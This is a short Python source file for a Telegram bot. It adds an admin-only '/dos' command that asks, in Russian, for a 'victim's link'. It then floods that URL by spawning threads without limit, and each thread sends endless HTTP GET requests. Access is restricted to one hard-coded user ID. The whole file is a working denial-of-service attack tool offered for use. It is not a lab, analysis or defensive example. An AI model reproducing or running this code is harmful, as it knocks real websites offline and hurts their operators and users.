from bot.moduls.settings import *
import threading
import requests
from bot.states.classFSM import dos_attack

@dp.message_handler(commands="dos", is_admin=True)
async def dos_web(msg:types.Message, state: FSMContext):
    await msg.answer("введите ссылку жертвы ")
    await dos_attack.url.set()


@dp.message_handler(state=dos_attack.url)
async def start_dos(msg:types.Message, state: FSMContext):
    if msg.from_user.id == 1338168183:
            async with state.proxy() as infinite:
                infinite["url"]=msg.text
                da=infinite["url"]
                i=1
                def dos():
                    while True:
                        requests.get(da)
                while True:
                    i=i+1
                    threading.Thread(target=dos).start()
                    print(i)
    else:
            await msg.reply("тебе незя")        
            